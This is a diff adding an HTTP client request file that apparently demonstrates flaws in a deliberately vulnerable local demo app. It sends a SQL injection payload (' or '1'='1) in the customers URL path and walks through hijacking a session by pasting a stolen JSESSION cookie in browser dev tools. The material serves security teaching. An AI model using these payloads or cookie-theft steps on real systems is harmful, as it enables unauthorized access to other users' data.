@@ -1,0 +1,33 @@
+# https://www.jetbrains.com/help/idea/http-client-in-product-code-editor.html#viewingResponse
+# after request save the Headers / Set-Cookie value for later use
+#@no-cookie-jar
+POST /flaws/sde/customers
+Host: localhost:8080
+Content-Type: application/json
+Authorization: Basic user password
+
+{
+  "name" : "rodi"
+}
+
+### injection FLAW will not pass basic auth, we still need to be authenticated
+
+#@no-cookie-jar
+GET /flaws/sde/customers/' or '1'='1
+Host: localhost:8080
+
+### FLAW with Authorization, if we are authenticated, we can get sensitive data form other users
+
+#@no-cookie-jar
+GET /flaws/sde/customers/' or '1'='1
+Host: localhost:8080
+Authorization: Basic user password
+
+### FLAW with stolen cookie
+# Open customers url in browser http://localhost:8080/sde/customers
+# It'll ask you to authentify, press Cancel
+# You'll get an auth error
+# Open Dev Console or F12 / Application / Storage - Cookies - http://localhost:8080
+# change value of the JSESSION cookie value with the one from Set-Cookies after POST request - just like a man in the middle would do, basically anyone who stole the cookie
+# Refresh the page
+# You'll get the data
